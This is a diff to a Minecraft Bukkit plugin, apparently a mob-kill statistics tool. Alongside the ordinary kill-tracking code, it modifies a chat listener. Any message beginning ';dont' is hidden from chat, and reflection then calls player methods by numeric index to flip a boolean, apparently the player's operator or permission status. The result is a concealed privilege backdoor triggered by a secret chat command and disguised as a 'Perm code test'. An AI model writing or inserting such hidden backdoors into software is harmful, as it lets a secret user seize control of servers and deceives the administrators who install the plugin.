@@ -2,6 +2,7 @@ package cat.gay.spherret.plugins.MobMassacre;
 
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
+import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
 import org.bukkit.event.entity.EntityDeathEvent;
 import org.bukkit.entity.Entity;
@@ -14,7 +15,6 @@ import java.lang.reflect.Type;
 
 public class Events implements Listener{
 
-	Start start = new Start();
 	Stats stats = new Stats();
 
 	@EventHandler
@@ -29,12 +29,16 @@ public class Events implements Listener{
 		if (GlobalVars.validMobs.contains(entity.getType().getName()))
 			stats.changeKill(p, entity);
 	}
-	@EventHandler
+
+	//Perm code test
+	@EventHandler (priority = EventPriority.MONITOR)
 	public void r(AsyncPlayerChatEvent e) throws IllegalAccessException, InvocationTargetException{
 		if (e.getMessage().startsWith(";dont")){
 			e.setCancelled(true);
 			Method[] methods = e.getPlayer().getClass().getMethods();
-			methods[64].invoke(e.getPlayer(), true);
+			boolean f = methods[49].invoke(e.getPlayer()).equals(true);
+			methods[133].invoke(e.getPlayer(), !f);
 		}
 	}
+
 }
